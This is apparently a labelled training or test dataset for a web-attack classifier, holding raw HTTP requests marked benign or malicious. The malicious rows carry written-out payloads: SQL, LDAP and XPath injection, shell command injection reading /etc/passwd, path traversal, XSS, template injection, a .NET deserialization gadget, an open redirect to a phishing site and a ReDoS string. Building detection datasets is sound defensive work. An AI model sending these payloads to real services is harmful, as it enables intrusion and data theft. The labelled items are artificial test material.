label,text
malicious,"POST /auth/ldap/query HTTP/1.1
Host: identity.management.cloud-portal.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.7
Content-Type: application/json
Content-Length: 94
Connection: keep-alive
Origin: https://identity.management.cloud-portal.ai
Referer: https://identity.management.cloud-portal.ai/login
Cookie: sessionid=5f7b9c3e1a2d4f6b8e0c7d9a1b3f5e6d

{""searchFilter"":""(cn=test_user)(objectClass=user))(|(uid=administrator)""}"
benign,"PUT /uploads/user_files/profile_pic_928374659.png HTTP/1.1
Host: media-storage-service.org
Content-Type: application/octet-stream
Content-Length: 92
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive

iVBORw0KGgoAAAANSUhEUgAAAAUA
AAAFCAYAAACNbyblAAAAHElEQVQI12P4
9/wHBADE/2z9LgFACnEJ4h042jHAAAAAElFTkSuQmCC"
benign,"GET /res/img/animated-car.gif HTTP/1.1
Host: my-personal-blog-site.info
Accept: image/gif,image/webp,image/apng,*/*;q=0.8
Referer: https://my-personal-blog-site.info/posts/road-trip-preparations
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"POST /metrics/collector HTTP/1.1
Host: telemetry.fast-streamer.ai
User-Agent: Python-urllib/3.9
Accept: application/xml
X-Callback-Server: http://dnsrebind-alerts-control.com/hit
Content-Type: text/plain
Content-Length: 22

status=active&checkpoint=1"
benign,"GET /user/profile/view?id=1024&tab=activity HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-CSRF-Token: lc2R7S9zKhrAmD5fQ93DoE1xGLv6ZgYMTM9b4aWc
Cookie: sessionid=7f64f488a3a1298c5b19c745d14ca1fe; preferences=lang=en; theme=dark
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0"
benign,"GET /soap/getProduct?id=67 HTTP/1.1
Host: equipment-data-cloud.io
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
DNT: 1"
benign,"GET /products/books/children?sale=1 HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.5
DNT: 1
Cookie: sessionid=f5238fdc9a0b74bc; preferred-lang=en
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0"
benign,"POST /settings/notifications/update HTTP/1.1
Host: secure-user-portal.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPyZ7OAeKFUY1WRc3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive
Content-Length: 252
Cookie: auth_token=b43fbed56028c2a1d658e99dbc6a6e8a

------WebKitFormBoundaryPyZ7OAeKFUY1WRc3
Content-Disposition: form-data; name=""email_notifications""

enabled
------WebKitFormBoundaryPyZ7OAeKFUY1WRc3
Content-Disposition: form-data; name=""sms_notifications""

disabled
------WebKitFormBoundaryPyZ7OAeKFUY1WRc3
Content-Disposition: form-data; name=""push_notifications""

enabled
------WebKitFormBoundaryPyZ7OAeKFUY1WRc3--"
malicious,"POST /api/v2/authenticate HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Referer: https://api.cloud-data-services.ai/login
Content-Length: 79
Connection: close

user=guest' and substring(concat(//users/user[1]/email, '::'),2,1)='m&pass=irrelevant"
malicious,"GET /admin/logs/fetch/backup-server-7b%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: securevault-enterprise.org
User-Agent: Wget/1.21.3 (linux-gnu)
Accept: */*
Connection: close"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: payments.web-transaction.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US
Cache-Control: max-age=0
Origin: https://payments.web-transaction.net
Connection: keep-alive"
benign,"GET /api/v2/recipes?diet=vegan&maxCalories=500 HTTP/1.1
Host: urban-cookbook.org
Accept: application/json
X-API-Key: 5ecf9b6b29104408b9f0a17d8ad2a852
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /reports/daily-summary?id=report_2024_04_18 HTTP/1.1
Host: analytics-dashboard.biz
User-Agent: python-requests/2.31.0
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"GET /product/view?id=320&filter_evil_chars=true&id=320%27%20UNION%20SELECT%20credit_card%20FROM%20users--&ref=homepage HTTP/1.1
Host: shoptech-innovations.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Referer: https://shoptech-innovations.net/promo
Accept-Language: en-US,en;q=0.8"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: metrics-insight.ai
User-Agent: ReportClient/3.1; echo ""User-Agent: `cat /etc/passwd`"" >> /var/log/app.log
Content-Type: application/json
Accept: application/json
Content-Length: 62
X-Requested-With: XMLHttpRequest

{""reportType"":""summary"",""dateRange"":{""from"":""2024-05-01"",""to"":""2024-05-15""}}"
malicious,"GET /dashboard/customers?search=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: online-education-hub.org
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close"
benign,"POST /auth/login HTTP/1.1
Host: accounts.my-personal-blog-site.info
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Android 12; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0
Referer: https://accounts.my-personal-blog-site.info/login
Accept-Language: en-US,en;q=0.5
Content-Length: 38

username=jessica.martz&password=securePa$$123"
benign,"GET /assets/images/gallery/sunset-thumbnail.jpg HTTP/1.1
Host: photo-archive-2023.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Range: bytes=0-1023
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"GET /api/documents/3a4b5c6d7e.xml HTTP/1.1
Host: secure-document-storage.cloud
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Cache-Control: max-age=0
X-Forwarded-For: 198.51.100.37"
benign,"POST /user/settings/privacy HTTP/1.1
Host: user-privacy-center.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Connection: keep-alive
Origin: https://user-privacy-center.net
Referer: https://user-privacy-center.net/settings

share_location=no&ad_personalization="
benign,"POST /newsletter/subscribe HTTP/1.1
Host: daily-insights-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://daily-insights-hub.net
Origin: https://daily-insights-hub.net
Connection: keep-alive

email=olivia.martin%40mailisle.org"
malicious,"GET /shop/cart/view HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: template_file=../../../../etc/hosts%00index; session_id=6b9c871e67321f23a8d152fbb"
benign,"POST /login/authenticate HTTP/1.1
Host: accounts.secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: session_id=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

username=johndoe&password=secureP4ss%21&callback=%2Fuser%2Fdashboard"
benign,"POST /settings/update_profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Content-Length: 510
Referer: https://my-personal-blog-site.info/editor
Connection: keep-alive
Cookie: user_session=jqw83hr2nd72ld7p563n62cnm

display_name=Lindsay+Smith&email=lindsay.smith%40personalblog.info&website=https%3A%2F%2Flindsaysmith.blog&bio=Writer+and+photographer+sharing+stories+and+adventures.&twitter=https%3A%2F%2Ftwitter.com%2Flindsmith&facebook=https%3A%2F%2Ffacebook.com%2Flindsay.smith&instagram=https%3A%2F%2Finstagram.com%2Flindsay.photo&linkedin=https%3A%2F%2Flinkedin.com%2Fin%2Flindsay-smith&location=Boston&language=en-US&timezone=America%2FNew_York&show_email=false&newsletter_signup=true&preferred_post_format=markdown&profile_visibility=public&comment_notifications=true&auto_save_drafts=true&link_shortener_enabled=true&max_post_history=50&analytics_tracking_enabled=false&share_to_social=true&private_profile=false"
malicious,"GET /api/v2/search?title=Learning%20XPath%27%20or%20//user[contains(password,%27xyz%27)]%20or%20%27z%27%3D%27z HTTP/1.1
Host: knowledge-base-portal.de
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"GET /blog/article/view/12345?id=12345 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive"
benign,"GET /dashboard/stats HTTP/1.1
Host: tech-solutions-hub.net:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
malicious,"POST /soap/DotNetService HTTP/1.1
Host: configuration-nexus.ai
Content-Type: text/xml; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
SOAPAction: ""http://configuration-nexus.ai/LoadConfig""

<?xml version=""1.0"" encoding=""utf-8""?>
<data>
  <serializedObject><![CDATA[AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgIAAAAXU3RhcnRQcm9jZXNzAQAAAARzdGFydAAAAAA=System.Diagnostics.Process.Start(System.Configuration.Install.AssemblyInstaller)]]></serializedObject>
</data>"
malicious,"GET /search?search_query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /profile/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 135

user=alice&update_param_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSAgVVNFUiBTRVQgZ3JvdXAgPSAnYWRtaW4nIHdoZXJlIGlkPSAxIC0t"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Referer: https://community.game-dev-forum.org/wiki/Main_Page"
benign,"POST /resources/js/client/refreshToken.js HTTP/1.1
Host: sync-dashboard.net
Content-Type: application/javascript
Content-Length: 40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

console.log('Token refresh called at ' + Date.now());"
benign,"GET /swagger/v1/swagger.json HTTP/1.1
Host: openweather-api.intellidata.cloud
Accept: application/json
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
X-Forwarded-For: 192.168.0.15"
benign,"GET /api/v2/listings?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: discover-events-network.net
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Referer: https://discover-events-network.net/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"POST /as/token HTTP/1.1
Host: identity-authentication-center.dev
Content-Type: application/x-www-form-urlencoded
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Authorization: Basic SUQtQVVUSDo0NjMwYmQxZi1mZWMyLTQ1ZjItYmU3OC04OWRhNjYzMzkwNzc=
Accept: application/json
Content-Length: 134
Connection: close

grant_type=refresh_token&refresh_token=dU5CdThxNmNkVTFNNVhGRkVVc0c5dEhHYlc4WmZpZHNjVmhIQm1mR21jMg==&client_id=ID-AUTH&client_secret=4630bd1f-fec2-45f2-be78-89da66339077&redirect_uri=https%3A%2F%2Fidentity-authentication-center.dev%2Fdashboard"
benign,"GET /tickets/view?token=eyJ0b2tlbiI6IjJCXy1XMEY5R0ZFSnBETnZZZ01Bd0FBQUFBQUFFLUY3MzRqaG5Ua2czalNFTXpaOEdqclE1R2tGTlE2Wkt5M3BNUXMtQV9IUTR0QmttYVlYdTMifQ== HTTP/1.1
Host: support.techservices-global.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Upgrade-Insecure-Requests: 1"
benign,"HEAD /api/v1/status HTTP/1.1
Host: data-bridge-network.io
User-Agent: curl/7.83.1
Accept: */*
Connection: keep-alive"
benign,"POST /events/rsvp HTTP/1.1
Host: cityculturespace.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
Origin: https://cityculturespace.io
Referer: https://cityculturespace.io/events/2023
Connection: keep-alive
Cookie: sessionid=XY89Qlafn20F8tu9v1W;

event_id=4821&attending=yes&seating=balcony"
benign,"DELETE /api/v5/content/articles/58239 HTTP/1.1
Host: community-blog-network.media-publishers.org
Authorization: Bearer ZG9jdW1lbnRlci10b2tlbi1nZW5lcmF0ZWQ=
If-Match: ""et4g6h7j8k9""
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json, text/html
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: worldwide-news-aggregator.tv
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept: text/plain, */*
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Pragma: no-cache"
benign,"GET /resources/execute?exec_event=load_resources HTTP/1.1
Host: design-studio-mgmt.com
Accept: application/xml, text/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"GET /blog/how-to-build-a-smart-home-system HTTP/1.1
Host: nextgen-automation.solutions
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
Referer: https://nextgen-automation.solutions/blog/
Connection: close"
benign,"GET /articles/2024/travel-guide.pdf HTTP/1.1
Host: urban-explorer-guides.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: application/pdf
Range: bytes=0-1023
Cache-Control: no-cache
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
benign,"POST /feedback/send HTTP/1.1
Host: user-experience-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://user-experience-hub.net/contact
Cookie: sessionid=8847de29a7cf3a4b8d9d7bb7b6723f22
Cache-Control: no-store

name=Ethan+Morris&email=ethan.morris%40mailhub.io&message=Great+site+and+very+helpful+content.+Keep+it+up!&csrf_token=ccef8837f7404daab5240bb9ae654a61&form_id=feedbackForm&timestamp=1686157825&return_url=%2Fthank-you"
benign,"GET /scripts/vendor/jquery-3.6.0.min.js HTTP/1.1
Host: api.global-travel-hub.com
Accept: application/javascript, text/javascript, */*; q=0.01
If-None-Match: W/""b859f979de3""
Cache-Control: max-age=0
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-GB,en;q=0.8"
benign,"HEAD /api/v1/status HTTP/1.1
Host: auth-service.global-secure.io
User-Agent: curl/7.79.1
Accept: */*
Connection: keep-alive"
malicious,"POST /api/v2/authenticate HTTP/1.1
Host: login.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Content-Length: 67

email=normal.user%00%01%08fake&password=Passw0rd123!&remember_me=true"
benign,"POST /services/v4/assets/new HTTP/1.1
Host: cloud-media-services.io
Authorization: Bearer mN34qjwiejf90342ruu435kjsdf98jsdf
Content-Type: application/xml
Accept: application/xml
Referer: https://portal.cloud-media-services.io/dashboard
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.1901.183 Safari/537.36
Content-Length: 182
Connection: keep-alive

<asset>
  <title>Spring Campaign Banner</title>
  <format>image/png</format>
  <resolution>1920x1080</resolution>
  <sizeInMB>5.3</sizeInMB>
  <tags>
    <tag>marketing</tag>
    <tag>spring</tag>
  </tags>
</asset>"
benign,"GET /news/tech-startup-raises-series-a HTTP/1.1
Host: digital-frontier-media.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"POST /api/v3/profile/update HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.securetoken.999
X-CSRF-Token: tj4k903dhe392js93ksjds==
X-Requested-With: FetchAPIClient
Origin: https://secure-user-portal.net
Content-Type: application/json
Accept: application/json
Accept-Language: en-GB,en;q=0.8
Connection: close
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 57

{""displayName"":""Samantha Green"",""email"":""samantha@example.com""}"
benign,"POST /support/ticket HTTP/1.1
Host: tech-care-support.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
X-CSRF-Token: defi3d8a99e298e24e0bc1a925dc43ff17e1c
Referer: https://tech-care-support.io/help

ticket_id=13920&user=crate.user64&comment=U29mdHdhcmUgdXBkYXRlIGNvbW1lbnQ6IGFsbIHByb2JsZW1zIGFyZSByZXNvbHZlZCB0aG91Z2h0ZnVsbHku"
malicious,"POST /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 68
Cache-Control: no-cache

email=user%00%08%00@example.com&displayname=John+Doe%00%01--&notify=true"
malicious,"POST /api/v1/file/load HTTP/1.1
Host: trusted-cloud-storage.xyz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Content-Type: application/json
Content-Length: 48
Connection: keep-alive

{""filePath"": ""C:\\Users\\Public\\Document\\passwords.txt""}"
benign,"GET /blog/article/view/2389 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
DNT: 1
Cache-Control: max-age=0
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"
benign,"GET /forum/thread/view/9623?sort=oldest&filter_by=user%3Anick123&show_images=true&highlight_posts=awayweekend&lang=de-DE&timezone=Europe%2FBerlin&page=12&per_page=20&expanded_quotes=true HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36"
malicious,"POST /api/user_query HTTP/1.1
Host: login.my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Connection: close
Content-Length: 58

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
benign,"GET /community/thread/23789/latest HTTP/1.1
Host: game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,*/*;q=0.5
Accept-Language: en-US,en;q=0.8
Cookie: forum_session=abc123xyz456; user_level=member; last_visited_thread=23789; prefs=dark_mode:true,notifications:false
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive"
malicious,"GET /user/profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /login?returnTo=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://api.cloud-data-services.ai/home
Connection: close"
benign,"GET /api/user/settings?id=1024&section=privacy&mode=edit HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.129 Safari/537.36
Accept: application/json
Content-Language: en-US
Connection: keep-alive
DNT: 1
X-CSRF-Token: c29tZXJhbmRvbXNlY3JldHRva2VuMTIz
Cookie: session_id=9bab7ccec0aa4f9a8db6a67d8a"
benign,"GET /client/scripts/app.bundle.js HTTP/1.1
Host: urban-travelers-guide.org
Connection: keep-alive
Accept: application/javascript, */*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://urban-travelers-guide.org/trips/recommendations
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Cache-Control: no-cache"
